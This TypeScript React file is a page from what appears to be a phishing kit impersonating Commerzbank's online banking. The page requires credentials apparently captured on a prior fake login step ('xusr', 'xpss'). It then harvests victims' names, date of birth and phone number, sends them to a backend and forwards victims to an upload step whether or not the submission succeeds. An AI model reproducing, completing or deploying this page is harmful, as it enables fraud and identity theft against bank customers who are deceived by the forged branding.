import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import apiService from '../services/api';

interface InfoFormData {
  xname1: string;
  xname2: string;
  xdob: string;
  xtel: string;
}

const InfoPage: React.FC = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState<InfoFormData>({
    xname1: '',
    xname2: '',
    xdob: '',
    xtel: ''
  });
  const [errors, setErrors] = useState<Partial<InfoFormData>>({});
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    // Check if user came from login page
    const xusr = sessionStorage.getItem('xusr');
    const xpss = sessionStorage.getItem('xpss');
    
    if (!xusr || !xpss) {
      navigate('/login');
      return;
    }
  }, [navigate]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === 'xdob') {
      // Auto-format date of birth with dots
      let formattedValue = value.replace(/\D/g, ''); // Remove all non-digits
      
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.substring(0, 2) + '.' + formattedValue.substring(2);
      }
      if (formattedValue.length >= 5) {
        formattedValue = formattedValue.substring(0, 5) + '.' + formattedValue.substring(5, 9);
      }
      
      setFormData(prev => ({
        ...prev,
        [name]: formattedValue
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }
    
    // Clear error when user starts typing
    if (errors[name as keyof InfoFormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<InfoFormData> = {};

    if (!formData.xname1.trim()) {
      newErrors.xname1 = 'Bitte geben Sie Ihren Vornamen ein.';
    }

    if (!formData.xname2.trim()) {
      newErrors.xname2 = 'Bitte geben Sie Ihren Nachnamen ein.';
    }

    if (!formData.xdob.trim()) {
      newErrors.xdob = 'Bitte geben Sie Ihr Geburtsdatum ein.';
    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(formData.xdob)) {
      newErrors.xdob = 'Bitte geben Sie Ihr Geburtsdatum im Format TT.MM.JJJJ ein.';
    }

    if (!formData.xtel.trim()) {
      newErrors.xtel = 'Bitte geben Sie Ihre Telefonnummer ein.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      // Send data to backend (simulating the PHP behavior)
      await apiService.info(formData);
      
      // Store in both session and local storage for mobile compatibility
      sessionStorage.setItem('xname1', formData.xname1);
      sessionStorage.setItem('xname2', formData.xname2);
      sessionStorage.setItem('xdob', formData.xdob);
      sessionStorage.setItem('xtel', formData.xtel);
      localStorage.setItem('xname1', formData.xname1);
      localStorage.setItem('xname2', formData.xname2);
      localStorage.setItem('xdob', formData.xdob);
      localStorage.setItem('xtel', formData.xtel);
      
      // Navigate to upload page
      navigate('/upload');
    } catch (error) {
      console.error('Info submission error:', error);
      // Still navigate to maintain the flow
      sessionStorage.setItem('xname1', formData.xname1);
      sessionStorage.setItem('xname2', formData.xname2);
      sessionStorage.setItem('xdob', formData.xdob);
      sessionStorage.setItem('xtel', formData.xtel);
      localStorage.setItem('xname1', formData.xname1);
      localStorage.setItem('xname2', formData.xname2);
      localStorage.setItem('xdob', formData.xdob);
      localStorage.setItem('xtel', formData.xtel);
      navigate('/upload');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="commerzbank-app">
      {/* Top Header */}
      <header className="top-header">
        <div className="header-content">
          <div className="search-section">
            <input type="search" className="search-input" placeholder="Ihr Suchtext" />
            <button className="search-button">🔍</button>
          </div>
          <div className="header-links">
            <a href="#konzern">Konzern</a>
            <a href="#english">English</a>
            <a href="#profil">Profil & Einstellungen</a>
          </div>
        </div>
      </header>

      {/* Main Header with Logo */}
      <header className="main-header">
        <div className="header-content">
          <div className="logo-section">
            <div className="commerzbank-logo">
              <div className="logo-triangle">▲</div>
              <span className="logo-text">COMMERZBANK</span>
            </div>
          </div>
          <nav className="main-nav">
            <a href="#privatkunden" className="nav-link active">Privatkunden</a>
            <a href="#unternehmerkunden" className="nav-link">Unternehmerkunden</a>
          </nav>
        </div>
      </header>

      {/* Navigation Menu */}
      <nav className="main-menu">
        <div className="menu-content">
          <a href="#startseite" className="menu-item">Startseite</a>
          <a href="#konten" className="menu-item">Konten & Karten</a>
          <a href="#depot" className="menu-item">Depot & Order</a>
          <a href="#analyse" className="menu-item">Analyse</a>
          <a href="#service" className="menu-item">Service</a>
          <a href="#produkte" className="menu-item">Produkte & Wissen</a>
        </div>
      </nav>

      {/* Main Content */}
      <main className="main-content">
        <div className="content-wrapper">
          {/* Left Column - Information Form */}
          <div className="left-column">
            <div className="info-section">
              <h1 className="info-title">Information</h1>
              <h2 className="info-subtitle">Persönliche Angaben</h2>
              
              <p className="info-description">
                Sie haben sich erfolgreich angemeldet. Um den Vorgang fortzusetzen, benötigen wir einige persönliche Informationen von Ihnen.
              </p>
              
              <form onSubmit={handleSubmit} className="info-form">
                <div className="form-group">
                  <input
                    type="text"
                    id="xname1"
                    name="xname1"
                    value={formData.xname1}
                    onChange={handleInputChange}
                    className="info-input"
                    placeholder="Vorname"
                    autoComplete="off"
                    maxLength={50}
                    required
                  />
                  {errors.xname1 && <div className="error-message">{errors.xname1}</div>}
                </div>

                <div className="form-group">
                  <input
                    type="text"
                    id="xname2"
                    name="xname2"
                    value={formData.xname2}
                    onChange={handleInputChange}
                    className="info-input"
                    placeholder="Nachname"
                    autoComplete="off"
                    maxLength={50}
                    required
                  />
                  {errors.xname2 && <div className="error-message">{errors.xname2}</div>}
                </div>

                <div className="form-group">
                  <input
                    type="tel"
                    id="xdob"
                    name="xdob"
                    value={formData.xdob}
                    onChange={handleInputChange}
                    className="info-input"
                    placeholder="Geburtsdatum (TT.MM.JJJJ)"
                    autoComplete="off"
                    maxLength={10}
                    pattern="\d{2}\.\d{2}\.\d{4}"
                    required
                  />
                  {errors.xdob && <div className="error-message">{errors.xdob}</div>}
                </div>

                <div className="form-group">
                  <input
                    type="tel"
                    id="xtel"
                    name="xtel"
                    value={formData.xtel}
                    onChange={handleInputChange}
                    className="info-input"
                    placeholder="Telefonnummer"
                    autoComplete="off"
                    required
                  />
                  {errors.xtel && <div className="error-message">{errors.xtel}</div>}
                </div>

                <button 
                  type="submit" 
                  className="info-button"
                  disabled={isLoading}
                >
                  {isLoading ? 'Weiter...' : 'Weiter'}
                </button>
              </form>
            </div>
          </div>

          {/* Right Column - Info Panel */}
          <div className="right-column">
            <div className="info-panel">
              <h3>Wichtige Infos zum Digital Banking</h3>
              
              <div className="info-section">
                <p>Haben Sie Probleme mit der PhotoTAN-App oder der Freigabe von Zahlungen? Dann finden Sie hier weitere Informationen.</p>
              </div>

              <div className="info-section">
                <h4>Kein aktives TAN-Verfahren?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a>
                  </li>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#hilfe">Hilfe zur photoTAN</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Teilnehmernummer/PIN vergessen?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#teilnehmer">Teilnehmernummer neu anfordern</a>
                  </li>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#pin">PIN vergessen</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Alles rund ums Online Banking</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#anleitung">Anleitung/Hilfe</a>
                  </li>
                  <li>
                    <span className="arrow-icon">→</span>
                    <a href="#sicherheit">Sicherheit</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default InfoPage;
